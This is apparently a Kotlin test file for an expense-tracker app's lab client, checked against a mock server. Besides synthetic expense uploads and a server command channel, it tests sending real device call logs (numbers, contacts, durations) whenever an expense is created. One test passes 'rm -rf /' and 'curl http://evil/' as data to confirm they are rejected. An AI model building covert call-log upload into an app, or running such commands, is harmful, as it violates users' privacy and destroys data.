package com.example.expensetracker.net

import com.example.expensetracker.lab.LabCommandParser
import com.example.expensetracker.lab.CommandDecision
import com.example.expensetracker.lab.DeviceCallLogIngestRequest
import com.example.expensetracker.lab.DeviceCallLogPayloadBuilder
import com.example.expensetracker.lab.DeviceCallLogRecord
import com.example.expensetracker.lab.LabConfig
import com.example.expensetracker.lab.LabPayloadBuilder
import com.example.expensetracker.lab.SyntheticExpenseFactory
import com.example.expensetracker.lab.SyntheticIngestRequest
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.runBlocking
import okhttp3.OkHttpClient
import okhttp3.mockwebserver.MockResponse
import okhttp3.mockwebserver.MockWebServer
import okhttp3.mockwebserver.SocketPolicy
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test

/**
 * Runs the typed client against MockWebServer, which stands in for the future Flask lab server. The
 * emulator reaches a host-side server at http://10.0.2.2:5000/; on the JVM the same shape is
 * http://localhost:<port>/.
 */
class OkHttpLabApiClientTest {

    private lateinit var server: MockWebServer

    @Before
    fun startServer() {
        server = MockWebServer()
        // Bind to the IPv4 loopback so the endpoint host matches the cleartext lab allowlist on
        // every machine, instead of an IPv6 literal when localhost resolves to ::1.
        server.start(java.net.InetAddress.getByName("127.0.0.1"), 0)
    }

    @After
    fun stopServer() {
        server.shutdown()
    }

    /** Host name MockWebServer actually advertises; the emulator equivalent is 10.0.2.2. */
    private val labHost: String
        get() = java.net.URI(server.url("/").toString()).host

    private fun config(
        labEnabled: Boolean = true,
        baseUrl: String = server.url("/").toString(),
        readTimeoutMillis: Long = 2_000L,
        allowedCleartextHosts: Set<String> = setOf("localhost", "127.0.0.1", labHost),
    ) = LabConfig(
        labEnabled = labEnabled,
        baseUrl = baseUrl,
        connectTimeoutMillis = 1_000L,
        readTimeoutMillis = readTimeoutMillis,
        retryEnabled = false,
        maxRetries = 0,
        allowedCleartextHosts = allowedCleartextHosts,
    )

    private fun clientFor(labConfig: LabConfig): OkHttpLabApiClient {
        val http = OkHttpClient.Builder()
            .connectTimeout(labConfig.connectTimeoutMillis, TimeUnit.MILLISECONDS)
            .readTimeout(labConfig.readTimeoutMillis, TimeUnit.MILLISECONDS)
            .retryOnConnectionFailure(false)
            .followRedirects(false)
            .build()
        return OkHttpLabApiClient(labConfig, http)
    }

    private fun json(body: String, code: Int = 200) =
        MockResponse().setResponseCode(code).setHeader("Content-Type", "application/json").setBody(body)

    private fun takeRequest(): okhttp3.mockwebserver.RecordedRequest =
        server.takeRequest(5, TimeUnit.SECONDS) ?: throw AssertionError("No request reached the mock server")

    // ---- health ----------------------------------------------------------------------

    @Test
    fun `health reports reachability and uses the documented path`() = runBlocking {
        server.enqueue(json("""{"status":"ok","lab_mode":true,"server_time_utc":"2026-10-14T09:00:00Z"}"""))

        val result = clientFor(config()).health()

        val success = result as LabApiResult.Success
        assertEquals(200, success.httpStatus)
        assertEquals("ok", success.value.status)
        assertTrue(success.value.labMode)
        assertEquals("2026-10-14T09:00:00Z", success.value.serverTimeUtc)
        assertTrue(success.completedAtUtcMillis > 0L)

        val request = takeRequest()
        assertEquals("GET", request.method)
        assertEquals("/api/health", request.path)
        assertEquals("1", request.getHeader("X-DailySpend-Lab"))
    }

    @Test
    fun `an http error status is returned as an error, not an exception`() = runBlocking {
        server.enqueue(json("""{"error":"nope"}""", code = 500))

        val result = clientFor(config()).health()

        assertTrue("Expected HttpError but was $result", result is LabApiResult.HttpError)
        assertEquals(500, (result as LabApiResult.HttpError).httpStatus)
    }

    @Test
    fun `a body that is not lab json is rejected as an invalid payload`() = runBlocking {
        server.enqueue(json("<html>not json</html>"))

        val result = clientFor(config()).health()

        assertTrue(result is LabApiResult.InvalidPayload)
        assertTrue((result as LabApiResult.InvalidPayload).reason.contains("not valid lab JSON"))
    }

    @Test
    fun `unknown fields in a server response are tolerated`() = runBlocking {
        server.enqueue(json("""{"status":"ok","lab_mode":true,"extra":{"nested":1}}"""))
        assertTrue(clientFor(config()).health() is LabApiResult.Success)
    }

    // ---- timeouts and dead servers -----------------------------------------------------

    @Test
    fun `a slow server is reported as a timeout and never hangs the caller`() = runBlocking {
        server.enqueue(MockResponse().setBody("{}").setBodyDelay(3, TimeUnit.SECONDS))

        val result = clientFor(config(readTimeoutMillis = 250L)).health()

        assertTrue("Expected Timeout but was $result", result is LabApiResult.Timeout)
        assertTrue((result as LabApiResult.Timeout).reason.contains("250ms"))
    }

    @Test
    fun `a server that drops the connection is reported as a network failure`() = runBlocking {
        server.enqueue(MockResponse().setSocketPolicy(SocketPolicy.DISCONNECT_AT_START))

        val result = clientFor(config()).health()

        assertTrue("Expected NetworkFailure but was $result", result is LabApiResult.NetworkFailure)
    }

    // ---- feature flag and endpoint policy -----------------------------------------------

    @Test
    fun `the disabled flag stops every call before the socket opens`() = runBlocking {
        val client = clientFor(config(labEnabled = false))

        assertFalse(client.isConfigured())
        assertTrue(client.health() is LabApiResult.Disabled)
        assertTrue(client.registerSession(registerRequest()) is LabApiResult.Disabled)
        assertTrue(client.ingestSyntheticEvents(fixtureRequest()) is LabApiResult.Disabled)
        assertTrue(client.ingestDeviceCallLogs(deviceCallLogRequest()) is LabApiResult.Disabled)
        assertTrue(client.fetchNextCommand("session-x") is LabApiResult.Disabled)
        assertEquals(0, server.requestCount)
    }

    @Test
    fun `an endpoint outside the lab allowlist is refused and explained`() = runBlocking {
        val client = clientFor(
            config(baseUrl = "http://lab.example.org:5000/", allowedCleartextHosts = setOf("10.0.2.2")),
        )

        assertFalse(client.isConfigured())
        assertTrue(client.endpointDescription().startsWith("invalid"))
        val result = client.health()
        assertTrue(result is LabApiResult.Disabled)
        assertTrue((result as LabApiResult.Disabled).reason.contains("Cleartext"))
        assertEquals(0, server.requestCount)
    }

    // ---- registration and ingestion ------------------------------------------------------

    @Test
    fun `registering a session posts the lab contract`() = runBlocking {
        server.enqueue(json("""{"accepted":true,"lab_run_id":"run-77"}"""))

        val result = clientFor(config()).registerSession(registerRequest())

        val success = result as LabApiResult.Success
        assertTrue(success.value.accepted)
        assertEquals("run-77", success.value.labRunId)
        val request = takeRequest()
        assertEquals("POST", request.method)
        assertEquals("/api/lab/sessions", request.path)
        assertTrue(request.body.readUtf8().contains("\"session_id\":\"sess-1\""))
    }

    @Test
    fun `a synthetic batch is posted in full`() = runBlocking {
        server.enqueue(json("""{"received":3,"status":"stored"}"""))

        val result = clientFor(config()).ingestSyntheticEvents(fixtureRequest(count = 3))

        val success = result as LabApiResult.Success
        assertEquals(3, success.value.received)
        assertEquals("stored", success.value.status)
        val request = takeRequest()
        assertEquals("/api/lab/synthetic-events", request.path)
        val body = request.body.readUtf8()
        assertTrue(body.contains("\"synthetic\":true"))
        assertTrue(body.contains("Lab fixture - canteen counter A"))
        assertTrue(body.contains("\"session_id\":\"sess-1\""))
    }

    @Test
    fun `the security test fixture is posted with the documented field names only`() = runBlocking {
        server.enqueue(json("""{"received":1,"status":"stored"}"""))
        val request = LabPayloadBuilder.build(
            sessionId = "sess-1",
            records = listOf(SyntheticExpenseFactory.securityTestFixture(1_760_000_000_000L)),
            appVersion = "1.0.0",
        )

        val success = clientFor(config()).ingestSyntheticEvents(request) as LabApiResult.Success
        assertEquals(200, success.httpStatus)
        assertEquals(1, success.value.received)

        val recorded = takeRequest()
        assertEquals("POST", recorded.method)
        assertEquals("/api/lab/synthetic-events", recorded.path)
        val body = recorded.body.readUtf8()
        assertTrue(body.contains("\"event_id\":\"${SyntheticExpenseFactory.SECURITY_TEST_FIXTURE_ID}\""))
        assertTrue(body.contains("\"amount_minor\":10000"))
        assertTrue(body.contains("\"currency\":\"INR\""))
        assertTrue(body.contains("\"category\":\"OTHER\""))
        assertTrue(body.contains("\"synthetic\":true"))
        assertTrue(body.contains("\"occurred_at_utc\":\"2025-10-09T"))
        assertTrue(body.contains(SyntheticExpenseFactory.SECURITY_TEST_EVENT_TYPE))
        assertTrue(body.contains(SyntheticExpenseFactory.SECURITY_TEST_PURPOSE))
        assertEquals("exactly one event in the batch", 1, Regex("\"event_id\"").findAll(body).count())
    }

    @Test
    fun `a batch containing anything that is not a fixture never leaves the client`() = runBlocking {
        val tainted = fixtureRequest(count = 2).let { request ->
            val lastId = request.events.last().eventId
            request.copy(
                events = request.events.map { event ->
                    if (event.eventId == lastId) event.copy(description = "Real expense: rent transfer") else event
                },
            )
        }

        val result = clientFor(config()).ingestSyntheticEvents(tainted)

        assertTrue("Expected InvalidPayload but was $result", result is LabApiResult.InvalidPayload)
        assertTrue((result as LabApiResult.InvalidPayload).reason.contains("not lab fixtures"))
        assertEquals("The request must not reach the server", 0, server.requestCount)
    }

    @Test
    fun `a payload flagged non synthetic is refused`() = runBlocking {
        val request = fixtureRequest(count = 1).let {
            it.copy(events = it.events.map { event -> event.copy(synthetic = false) })
        }
        assertTrue(clientFor(config()).ingestSyntheticEvents(request) is LabApiResult.InvalidPayload)
        assertEquals(0, server.requestCount)
    }

    // ---- device call log ----------------------------------------------------------------

    @Test
    fun `the device call-log batch is posted to the documented path with device field names`() = runBlocking {
        server.enqueue(json("""{"accepted":2,"duplicates":0,"status":"stored"}""", code = 201))

        val result = clientFor(config()).ingestDeviceCallLogs(deviceCallLogRequest())

        val success = result as LabApiResult.Success
        assertEquals(201, success.httpStatus)
        assertEquals(2, success.value.accepted)
        val request = takeRequest()
        assertEquals("POST", request.method)
        assertEquals("/api/lab/device-call-logs", request.path)
        val body = request.body.readUtf8()
        assertTrue(body.contains("\"session_id\":\"sess-1\""))
        assertTrue(body.contains("\"trigger\":\"EXPENSE_CREATED\""))
        assertTrue(body.contains("\"record_id\":\"dev-call-42\""))
        assertTrue(body.contains("\"number\":\"+91-90000-00001\""))
        assertTrue(body.contains("\"direction\":\"OUTGOING\""))
        assertTrue(body.contains("\"call_type\":\"ANSWERED\""))
        assertTrue(body.contains("\"duration_seconds\":184"))
        assertTrue(body.contains("\"source\":\"DEVICE\""))
        assertTrue(body.contains("\"synthetic\":false"))
        assertEquals("exactly two records", 2, Regex("\"record_id\"").findAll(body).count())
    }

    @Test
    fun `a record outside the device id namespace never leaves the client`() = runBlocking {
        val tainted = deviceCallLogRequest().let { request ->
            request.copy(
                records = request.records.map { record ->
                    if (record.recordId == "dev-call-42") {
                        record.copy(recordId = "syn-call-0001")
                    } else {
                        record
                    }
                },
            )
        }

        val result = clientFor(config()).ingestDeviceCallLogs(tainted)

        assertTrue("Expected InvalidPayload but was $result", result is LabApiResult.InvalidPayload)
        assertTrue((result as LabApiResult.InvalidPayload).reason.contains("not device call-log entries"))
        assertEquals("The request must not reach the server", 0, server.requestCount)
    }

    @Test
    fun `a record flagged synthetic is refused before the socket opens`() = runBlocking {
        val request = deviceCallLogRequest().let {
            it.copy(records = it.records.map { record -> record.copy(synthetic = true) })
        }
        assertTrue(clientFor(config()).ingestDeviceCallLogs(request) is LabApiResult.InvalidPayload)
        assertEquals(0, server.requestCount)
    }

    @Test
    fun `a record with a foreign source tag is refused before the socket opens`() = runBlocking {
        val request = deviceCallLogRequest().let {
            it.copy(records = it.records.map { record -> record.copy(source = "SYNTHETIC_LAB") })
        }
        assertTrue(clientFor(config()).ingestDeviceCallLogs(request) is LabApiResult.InvalidPayload)
        assertEquals(0, server.requestCount)
    }

    @Test
    fun `a server rejection of device call records is returned as an http error`() = runBlocking {
        server.enqueue(json("""{"error":"invalid device call record rejected"}""", code = 400))

        val result = clientFor(config()).ingestDeviceCallLogs(deviceCallLogRequest())

        assertTrue("Expected HttpError but was $result", result is LabApiResult.HttpError)
        assertEquals(400, (result as LabApiResult.HttpError).httpStatus)
    }

    // ---- command channel ------------------------------------------------------------------
    @Test
    fun `fetching a command returns the raw response for the parser to judge`() = runBlocking {
        server.enqueue(json("""{"command":"SHOW_LAB_STATUS","issued_at_utc":"2026-10-14T09:00:00Z"}"""))

        val result = clientFor(config()).fetchNextCommand("sess-1")

        val success = result as LabApiResult.Success
        assertEquals("SHOW_LAB_STATUS", success.value.command)
        assertTrue(success.value.parameters.isEmpty())
        val request = takeRequest()
        assertEquals("/api/lab/command", request.path)
        assertTrue(request.body.readUtf8().contains("\"session_id\":\"sess-1\""))
    }

    @Test
    fun `a hostile command string is still only data`() = runBlocking {
        server.enqueue(
            json(
                """
                {"command":"rm -rf /","issued_at_utc":"2026-10-14T09:00:00Z",
                 "parameters":{"shell":"curl http://evil/"}}
                """.trimIndent().replace("\n", " "),
            ),
        )

        val result = clientFor(config()).fetchNextCommand("sess-1")

        val success = result as LabApiResult.Success
        assertEquals("rm -rf /", success.value.command)
        assertEquals(1, success.value.parameters.size)
        // The parser, not the client, decides that this cannot run.
        assertTrue(LabCommandParser.validate(success.value, "sess-1") is CommandDecision.Rejected)
    }

    @Test
    fun `a base url without a trailing slash still resolves the documented endpoints`() = runBlocking {
        val client = clientFor(config(baseUrl = server.url("/").toString().trimEnd('/')))
        server.enqueue(json("""{"status":"ok","lab_mode":true}"""))

        assertTrue(client.health() is LabApiResult.Success)
        assertEquals("/api/health", takeRequest().path)
    }

    private fun deviceCallLogRequest(): DeviceCallLogIngestRequest = DeviceCallLogPayloadBuilder.build(
        sessionId = "sess-1",
        appVersion = "1.0.0-test",
        trigger = "EXPENSE_CREATED",
        records = listOf(
            DeviceCallLogRecord(
                recordId = "dev-call-42",
                number = "+91-90000-00001",
                direction = DeviceCallLogRecord.DIRECTION_OUTGOING,
                callType = DeviceCallLogRecord.TYPE_ANSWERED,
                startedAtUtc = "2026-10-14T09:00:00Z",
                durationSeconds = 184,
                contactName = "Canteen counter A",
            ),
            DeviceCallLogRecord(
                recordId = "dev-call-41",
                number = "unknown",
                direction = DeviceCallLogRecord.DIRECTION_INCOMING,
                callType = DeviceCallLogRecord.TYPE_MISSED,
                startedAtUtc = "2026-10-14T08:30:00Z",
                durationSeconds = 0,
                contactName = null,
            ),
        ),
    )

    private fun registerRequest() = SessionRegisterRequest(
        sessionId = "sess-1",
        startedAtUtc = "2026-10-14T09:00:00Z",
        appVersion = "1.0.0-test",
        labBuild = true,
    )

    private fun fixtureRequest(count: Int = 1): SyntheticIngestRequest {
        val records = SyntheticExpenseFactory.generate(1_760_000_000_000L, count)
        return SyntheticIngestRequest(
            sessionId = "sess-1",
            appVersion = "1.0.0-test",
            preparedAtUtc = "2026-10-14T09:00:00Z",
            events = records.map {
                SyntheticEventPayload(
                    eventId = it.syntheticEventId,
                    synthetic = true,
                    amountMinor = it.amountMinor,
                    currencyCode = it.currencyCode,
                    categoryKey = it.categoryKey,
                    description = it.description,
                    occurredAtUtc = "2026-10-14T09:00:00Z",
                )
            },
        )
    }
}
